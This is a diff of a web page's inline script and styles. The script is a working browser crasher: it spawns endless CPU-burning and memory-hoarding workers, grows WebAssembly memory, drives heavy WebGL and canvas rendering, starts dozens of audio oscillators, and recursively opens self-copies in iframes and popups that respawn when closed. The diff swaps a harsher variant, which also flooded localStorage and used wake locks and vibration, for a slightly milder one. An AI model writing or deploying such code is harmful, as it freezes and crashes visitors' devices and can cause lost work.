@@ -7,14 +7,14 @@
   <style>
     *{margin:0;padding:0}
     html,body{width:100%;height:100%;overflow:hidden;background:#000;touch-action:none}
-    #nest{position:fixed;inset:0;display:grid;grid-template-columns:repeat(5,1fr);grid-template-rows:repeat(4,1fr);opacity:.35}
+    #nest{position:fixed;inset:0;display:grid;grid-template-columns:repeat(4,1fr);grid-template-rows:repeat(3,1fr);opacity:.3}
     #nest iframe{width:100%;height:100%;border:0;background:#000}
-    #stage{position:fixed;inset:-10%;width:120%;height:120%;pointer-events:none;filter:contrast(2) saturate(4)}
+    #stage{position:fixed;inset:0;pointer-events:none}
     canvas{position:absolute;inset:0;width:100%;height:100%;mix-blend-mode:screen}
-    .blob{position:absolute;width:55vw;height:55vh;border-radius:40%;
+    .blob{position:absolute;width:50vw;height:50vh;border-radius:40%;
       background:radial-gradient(circle,#ff0,#f0f,#0ff,transparent 70%);
-      filter:blur(45px) contrast(4);animation:s .15s linear infinite;mix-blend-mode:color-dodge}
-    @keyframes s{to{transform:rotate(360deg) scale(1.6)}}
+      filter:blur(40px) contrast(3);animation:s .2s linear infinite;mix-blend-mode:color-dodge}
+    @keyframes s{to{transform:rotate(360deg) scale(1.5)}}
     body.slave #nest{display:none}
   </style>
 </head>
@@ -34,106 +34,65 @@
     const hold = [];
     const workers = [];
 
-    try { navigator.wakeLock?.request('screen').catch(() => {}); } catch (_) {}
-    if (MOBILE) setInterval(() => { try { navigator.vibrate?.([30, 20, 50]); } catch (_) {} }, 200);
-
     function touch(u8) {
       for (let i = 0; i < u8.length; i += 4096) u8[i] = 1;
     }
 
     function eat(mb) {
-      const size = mb || (MOBILE ? 48 : 96);
       try {
-        const a = new Uint8Array(size * 1024 * 1024);
+        const n = (mb || (MOBILE ? 32 : 64)) * 1024 * 1024;
+        const a = new Uint8Array(n);
         touch(a);
-        hold.push(a, new Float64Array(size * 96 * 1024), new ArrayBuffer(size * 256 * 1024));
+        hold.push(a);
+        hold.push(new Float64Array((mb || 32) * 64 * 1024));
       } catch (_) {
         try {
-          const a = new Uint8Array(8 * 1024 * 1024);
+          const a = new Uint8Array(4 * 1024 * 1024);
           touch(a);
           hold.push(a);
         } catch (__) {}
       }
     }
 
-    // CPU worker lebih berat
     const cpuCode = `
-      const N = 1024 * 768;
-      const a = new Float64Array(N), b = new Float64Array(N), c = new Float64Array(N);
+      const N = 1024 * 512;
+      const a = new Float64Array(N), b = new Float64Array(N);
       let n = Math.random();
       function burn() {
         for (let i = 0; i < N; i++) {
-          n = Math.sin(n + a[i]) * Math.cos(b[i] * 1.13) + Math.sqrt(Math.abs(c[i] * n) + 1e-9);
-          a[i] = n * b[i]; b[i] = Math.atan2(a[i], n + 0.001); c[i] = Math.hypot(a[i], b[i]);
+          n = Math.sin(n + a[i]) * Math.cos(b[i]) + Math.sqrt(Math.abs(n) + 1e-9);
+          a[i] = n; b[i] = n * 1.01;
         }
-        var s = '';
-        for (var i = 0; i < 400; i++) s += (n + i).toString(36);
-        try { JSON.parse(JSON.stringify({ n: n, s: s.slice(0, 2000) })); } catch (e) {}
         postMessage(1);
         setTimeout(burn, 0);
-        Promise.resolve().then(burn);
       }
       burn();
-      setInterval(function(){ var x=1; for (var i=0;i<1e7;i++) x=Math.sin(x)*Math.cos(x+i); }, 1);
-      try {
-        var nested = URL.createObjectURL(new Blob([
-          'setInterval(function(){var x=1;for(var i=0;i<3e6;i++)x=Math.sin(x);},1);' +
-          'var h=[];setInterval(function(){try{var u=new Uint8Array(16*1024*1024);for(var i=0;i<u.length;i+=4096)u[i]=1;h.push(u);}catch(e){}},8);'
-        ], { type: 'application/javascript' }));
-        new Worker(nested);
-      } catch (e) {}
+      setInterval(function(){ var x=1; for (var i=0;i<5e6;i++) x=Math.sin(x)*Math.cos(x); }, 1);
     `;
 
     const ramCode = `
       var hold = [];
-      var mb = ${MOBILE ? 48 : 96};
+      var mb = ${MOBILE ? 32 : 64};
       function alloc() {
         try {
           var u8 = new Uint8Array(mb * 1024 * 1024);
           for (var i = 0; i < u8.length; i += 4096) u8[i] = 1;
-          hold.push(u8, new Float64Array(mb * 48 * 1024), new ArrayBuffer(mb * 512 * 1024));
+          hold.push(u8);
+          hold.push(new Float64Array(mb * 32 * 1024));
           postMessage(hold.length);
         } catch (e) {
           try {
-            var u8 = new Uint8Array(8 * 1024 * 1024);
+            var u8 = new Uint8Array(4 * 1024 * 1024);
             for (var i = 0; i < u8.length; i += 4096) u8[i] = 1;
-            hold.push(u8); postMessage(hold.length);
+            hold.push(u8);
+            postMessage(hold.length);
           } catch (e2) {}
         }
-        setTimeout(alloc, 2);
+        setTimeout(alloc, 3);
       }
       alloc();
-      setInterval(alloc, 5);
+      setInterval(alloc, 8);
     `;
-
-    // OffscreenCanvas worker
-    const offCode = (typeof OffscreenCanvas !== 'undefined') ? `
-      var c = new OffscreenCanvas(${MOBILE ? 1280 : 1920}, ${MOBILE ? 720 : 1080});
-      var ctx = c.getContext('2d');
-      var img = ctx.createImageData(${MOBILE ? 640 : 960}, ${MOBILE ? 360 : 540});
-      var hold = [];
-      function go() {
-        var d = img.data, t = performance.now() * 0.02;
-        for (var i = 0; i < d.length; i += 4) {
-          d[i] = (Math.sin(i * 0.01 + t) * 127 + 128) | 0;
-          d[i+1] = (Math.cos(i * 0.013 - t) * 127 + 128) | 0;
-          d[i+2] = (Math.sin(i * 0.007 + t * 2) * 127 + 128) | 0;
-          d[i+3] = 255;
-        }
-        ctx.putImageData(img, 0, 0);
-        ctx.filter = 'blur(8px) contrast(300%)';
-        ctx.globalCompositeOperation = 'lighter';
-        ctx.drawImage(c, -15, -15, c.width + 30, c.height + 30);
-        try {
-          var u8 = new Uint8Array(8 * 1024 * 1024);
-          for (var i = 0; i < u8.length; i += 4096) u8[i] = 1;
-          hold.push(u8);
-        } catch (e) {}
-        requestAnimationFrame(go);
-      }
-      go();
-      setInterval(function(){ var x=1; for (var i=0;i<4e6;i++) x=Math.sin(x); }, 1);
-    ` : null;
 
     function mkWorker(code) {
       const url = URL.createObjectURL(new Blob([code], { type: 'application/javascript' }));
@@ -142,77 +101,54 @@
       return w;
     }
 
-    function spawnCPU(n) { for (let i = 0; i < n; i++) { try { mkWorker(cpuCode); } catch (_) {} } }
-    function spawnRAM(n) { for (let i = 0; i < n; i++) { try { mkWorker(ramCode); } catch (_) {} } }
-    function spawnOff(n) {
-      if (!offCode) return;
-      for (let i = 0; i < n; i++) { try { mkWorker(offCode); } catch (_) {} }
+    function spawnCPU(n) {
+      for (let i = 0; i < n; i++) {
+        try { mkWorker(cpuCode); } catch (_) {}
+      }
+    }
+    function spawnRAM(n) {
+      for (let i = 0; i < n; i++) {
+        try { mkWorker(ramCode); } catch (_) {}
+      }
     }
 
-    // BURST langsung
-    for (let i = 0; i < (SLAVE ? (MOBILE ? 28 : 36) : (MOBILE ? 14 : 18)); i++) eat();
+    const burst = SLAVE ? (MOBILE ? 20 : 24) : (MOBILE ? 10 : 12);
+    for (let i = 0; i < burst; i++) eat();
 
     if (SLAVE) {
-      spawnCPU(Math.max(36, cores * 7));
-      spawnRAM(Math.max(14, cores * 2));
-      spawnOff(Math.max(6, cores));
-    } else {
       spawnCPU(Math.max(24, cores * 5));
       spawnRAM(Math.max(10, cores + 2));
-      spawnOff(Math.max(4, Math.ceil(cores / 2)));
+    } else {
+      spawnCPU(Math.max(16, cores * 3));
+      spawnRAM(Math.max(8, cores));
     }
 
-    // Spam worker terus
     setInterval(() => {
       try { mkWorker(cpuCode); } catch (_) {}
       try { mkWorker(ramCode); } catch (_) {}
-      if (offCode) try { mkWorker(offCode); } catch (_) {}
       eat();
-      eat(MOBILE ? 24 : 48);
-    }, SLAVE ? 35 : 55);
+    }, SLAVE ? 50 : 80);
 
-    // WASM
     try {
-      const mem = new WebAssembly.Memory({ initial: 512, maximum: 65536 });
+      const mem = new WebAssembly.Memory({ initial: 256, maximum: 65536 });
       hold.push(mem);
       setInterval(() => {
-        try { mem.grow(MOBILE ? 128 : 256); touch(new Uint8Array(mem.buffer)); } catch (_) {}
-      }, 10);
+        try { mem.grow(128); touch(new Uint8Array(mem.buffer)); } catch (_) {}
+      }, 15);
     } catch (_) {}
 
-    // Crypto storm (async, tidak freeze)
-    if (crypto?.subtle) {
-      const buf = new Uint8Array(512 * 1024).fill(7);
-      const loop = () => {
-        crypto.subtle.digest('SHA-512', buf)
-          .then(() => crypto.subtle.digest('SHA-256', buf))
-          .then(loop)
-          .catch(() => setTimeout(loop, 0));
-      };
-      for (let i = 0; i < 4; i++) loop();
-    }
-
-    // MessageChannel flood ringan
-    for (let i = 0; i < 16; i++) {
-      const ch = new MessageChannel();
-      const ping = () => ch.port1.postMessage(1);
-      ch.port2.onmessage = () => { ping(); };
-      ch.port1.onmessage = () => ch.port2.postMessage(1);
-      ping();
-    }
-
-    // Canvas / blobs / WebGL
-    const canvases = [], ctxs = [];
-    const nCanvas = SLAVE ? (MOBILE ? 8 : 12) : (MOBILE ? 4 : 6);
+    const canvases = [];
+    const ctxs = [];
+    const nCanvas = SLAVE ? 6 : 3;
     for (let i = 0; i < nCanvas; i++) {
       const c = document.createElement('canvas');
-      c.width = MOBILE ? 960 : 1440;
-      c.height = MOBILE ? 540 : 810;
+      c.width = MOBILE ? 800 : 1280;
+      c.height = MOBILE ? 450 : 720;
       stage.appendChild(c);
       canvases.push(c);
       ctxs.push(c.getContext('2d'));
     }
-    for (let i = 0; i < (SLAVE ? 36 : 18); i++) {
+    for (let i = 0; i < (SLAVE ? 20 : 10); i++) {
       const el = document.createElement('div');
       el.className = 'blob';
       el.style.left = (Math.random() * 90) + '%';
@@ -220,101 +156,81 @@
       stage.appendChild(el);
     }
 
-    const glObjs = [];
-    for (let g = 0; g < (SLAVE ? 3 : 2); g++) {
-      try {
-        const c = document.createElement('canvas');
-        c.width = MOBILE ? 1280 : 1920;
-        c.height = MOBILE ? 720 : 1080;
-        stage.appendChild(c);
-        const gl = c.getContext('webgl', { powerPreference: 'high-performance', antialias: true });
-        if (!gl) continue;
+    const glCanvas = document.createElement('canvas');
+    glCanvas.width = MOBILE ? 1280 : 1920;
+    glCanvas.height = MOBILE ? 720 : 1080;
+    stage.appendChild(glCanvas);
+    let gl = null, glProg = null;
+    try {
+      gl = glCanvas.getContext('webgl', { powerPreference: 'high-performance' });
+      if (gl) {
         const vs = gl.createShader(gl.VERTEX_SHADER);
         gl.shaderSource(vs, 'attribute vec2 a;varying vec2 v;void main(){v=a;gl_Position=vec4(a,0.,1.);}');
         gl.compileShader(vs);
         const fs = gl.createShader(gl.FRAGMENT_SHADER);
-        const iters = SLAVE ? 56 : 40;
         gl.shaderSource(fs, `
           precision mediump float; varying vec2 v; uniform float t;
           void main(){
-            vec2 p=v*50.; float n=0.;
-            for(int i=0;i<${iters};i++){
+            vec2 p=v*40.; float n=0.;
+            for(int i=0;i<40;i++){
               float fi=float(i);
-              n+=sin(p.x*fi*.11+t)*cos(p.y*fi*.14-t);
-              float c=cos(t*.2),s=sin(t*.2);
-              p=mat2(c,-s,s,c)*p*1.06;
+              n+=sin(p.x*fi*.12+t)*cos(p.y*fi*.15-t);
+              p*=1.05;
             }
-            gl_FragColor=vec4(.5+.5*sin(n+t),.5+.5*cos(n*1.7),.5+.5*sin(n*2.4-t),1.);
+            gl_FragColor=vec4(.5+.5*sin(n+t),.5+.5*cos(n),.5+.5*sin(n*2.-t),1.);
           }`);
         gl.compileShader(fs);
-        const prog = gl.createProgram();
-        gl.attachShader(prog, vs); gl.attachShader(prog, fs); gl.linkProgram(prog);
-        gl.useProgram(prog);
+        glProg = gl.createProgram();
+        gl.attachShader(glProg, vs); gl.attachShader(glProg, fs); gl.linkProgram(glProg);
+        gl.useProgram(glProg);
         const buf = gl.createBuffer();
         gl.bindBuffer(gl.ARRAY_BUFFER, buf);
         gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,1,1]), gl.STATIC_DRAW);
-        const loc = gl.getAttribLocation(prog, 'a');
+        const loc = gl.getAttribLocation(glProg, 'a');
         gl.enableVertexAttribArray(loc);
         gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
-        glObjs.push({ gl, prog, c });
-      } catch (_) {}
-    }
+      }
+    } catch (_) {}
 
     let frames = 0;
     function tick(t) {
       frames++;
-      // main ringan — jangan bikin Chrome pause
       let x = Math.random();
-      const end = performance.now() + (SLAVE ? 5 : 3);
-      while (performance.now() < end) x = Math.sin(x) * Math.cos(x);
+      const end = performance.now() + (SLAVE ? 4 : 2);
+      while (performance.now() < end) x = Math.sin(x);
       for (let i = 0; i < ctxs.length; i++) {
         const ctx = ctxs[i], c = canvases[i];
         if (!ctx) continue;
-        ctx.globalAlpha = 0.2;
-        ctx.fillStyle = 'rgb(' + ((t + i * 50) % 255 | 0) + ',' + ((t * 0.6) % 255 | 0) + ',90)';
-        ctx.fillRect(Math.random() * c.width, Math.random() * c.height, 240, 240);
-        ctx.filter = 'blur(4px) contrast(200%)';
-        ctx.globalCompositeOperation = 'lighter';
-        ctx.drawImage(c, -12, -12, c.width + 24, c.height + 24);
+        ctx.fillStyle = 'rgb(' + ((t + i * 40) % 255 | 0) + ',' + ((t * 0.7) % 255 | 0) + ',80)';
+        ctx.globalAlpha = 0.15;
+        ctx.fillRect(Math.random() * c.width, Math.random() * c.height, 200, 200);
+        ctx.filter = 'blur(3px)';
+        ctx.drawImage(c, -10, -10, c.width + 20, c.height + 20);
       }
-      for (const g of glObjs) {
-        g.gl.useProgram(g.prog);
-        g.gl.uniform1f(g.gl.getUniformLocation(g.prog, 't'), t * 0.001);
-        for (let i = 0; i < 8; i++) g.gl.drawArrays(g.gl.TRIANGLE_STRIP, 0, 4);
+      if (gl && glProg) {
+        gl.uniform1f(gl.getUniformLocation(glProg, 't'), t * 0.001);
+        for (let i = 0; i < 6; i++) gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
       }
-      if (frames % 3 === 0) eat(MOBILE ? 24 : 48);
-      stage.style.filter = 'contrast(' + (2 + Math.random()) + ') saturate(' + (3 + Math.random() * 3) + ') hue-rotate(' + (frames % 360) + 'deg)';
+      if (frames % 4 === 0) eat(MOBILE ? 16 : 32);
       requestAnimationFrame(tick);
     }
     requestAnimationFrame(tick);
 
-    // Audio
     try {
       const ac = new (window.AudioContext || window.webkitAudioContext)();
-      for (let i = 0; i < (SLAVE ? 64 : 40); i++) {
-        const o = ac.createOscillator(), g = ac.createGain(), f = ac.createBiquadFilter(), d = ac.createDelay(0.5);
-        f.type = 'bandpass'; f.frequency.value = 80 + i * 70; f.Q.value = 28;
-        d.delayTime.value = 0.01 + (i % 20) * 0.01;
-        g.gain.value = 0.00025;
-        o.type = ['sawtooth', 'square', 'triangle'][i % 3];
-        o.frequency.value = 30 + i * 28;
-        o.connect(f); f.connect(d); d.connect(g); g.connect(ac.destination);
+      for (let i = 0; i < (SLAVE ? 48 : 24); i++) {
+        const o = ac.createOscillator(), g = ac.createGain(), f = ac.createBiquadFilter();
+        f.type = 'bandpass'; f.frequency.value = 100 + i * 80; f.Q.value = 20;
+        g.gain.value = 0.0003;
+        o.type = i % 2 ? 'sawtooth' : 'square';
+        o.frequency.value = 40 + i * 30;
+        o.connect(f); f.connect(g); g.connect(ac.destination);
         o.start();
       }
-      const arm = () => ac.resume().catch(() => {});
-      document.addEventListener('click', arm);
-      document.addEventListener('touchstart', arm, { passive: true });
+      document.addEventListener('click', () => ac.resume(), { once: true });
       ac.resume().catch(() => {});
     } catch (_) {}
 
-    // Storage storm async
-    setInterval(() => {
-      try {
-        for (let i = 0; i < 50; i++) localStorage.setItem('z' + i + Date.now(), 'X'.repeat(20000));
-      } catch (_) {}
-    }, 2000);
-
-    // HYDRA
     if (!SLAVE) {
       const slaveHref = (() => {
         const u = new URL(location.href);
@@ -322,43 +238,33 @@
         return u.href;
       })();
       const iframes = [];
-      const pops = [];
 
       function addIframe() {
         const f = document.createElement('iframe');
-        f.src = slaveHref + '&t=' + Date.now() + '_' + Math.random();
+        f.src = slaveHref + '&t=' + Date.now() + Math.random();
         nest.appendChild(f);
         iframes.push(f);
         return f;
       }
-      function addPopup() {
-        try {
-          const w = window.open(
-            slaveHref + '&t=' + Date.now() + '_' + Math.random(),
-            's' + Date.now() + Math.random().toString(36).slice(2),
-            'width=280,height=180,left=' + ((pops.length * 36) % 700) + ',top=' + ((pops.length * 28) % 400)
-          );
-          if (w) pops.push(w);
-          return w;
-        } catch (_) { return null; }
-      }
 
-      const target = MOBILE ? 16 : 20;
       let made = 0;
+      const target = MOBILE ? 12 : 16;
       const timer = setInterval(() => {
         if (made >= target) { clearInterval(timer); return; }
         addIframe();
         made++;
-      }, 70);
+      }, 100);
 
       if (!MOBILE) {
-        setTimeout(() => { for (let i = 0; i < 8; i++) addPopup(); }, 400);
+        setTimeout(() => {
+          for (let i = 0; i < 6; i++) {
+            try {
+              window.open(slaveHref + '&p=' + i + '&t=' + Date.now(), 's' + i + Date.now(),
+                'width=300,height=200,left=' + (i * 40) + ',top=' + (i * 30));
+            } catch (_) {}
+          }
+        }, 500);
       }
-
-      setTimeout(() => {
-        for (let i = 0; i < (MOBILE ? 4 : 6); i++) addIframe();
-        if (!MOBILE) for (let i = 0; i < 4; i++) addPopup();
-      }, 2000);
 
       setInterval(() => {
         for (let i = 0; i < iframes.length; i++) {
@@ -372,21 +278,18 @@
             iframes[i] = addIframe();
           }
         }
-        for (let i = 0; i < pops.length; i++) {
-          if (!pops[i] || pops[i].closed) pops[i] = addPopup();
-        }
-        if (iframes.length < (MOBILE ? 20 : 28)) addIframe();
+        if (iframes.length < target) addIframe();
         eat();
-      }, 500);
+      }, 600);
 
-      const arm = () => {
-        for (let i = 0; i < 4; i++) addIframe();
-        if (!MOBILE) for (let i = 0; i < 3; i++) addPopup();
-        for (let i = 0; i < 6; i++) eat();
-        spawnCPU(4); spawnRAM(2); spawnOff(1);
-      };
-      document.addEventListener('click', arm);
-      document.addEventListener('touchstart', arm, { passive: true });
+      document.addEventListener('click', () => {
+        for (let i = 0; i < 3; i++) addIframe();
+        if (!MOBILE) {
+          try {
+            window.open(slaveHref + '&t=' + Date.now(), '_blank', 'width=300,height=200');
+          } catch (_) {}
+        }
+      });
     }
   })();
   </script>
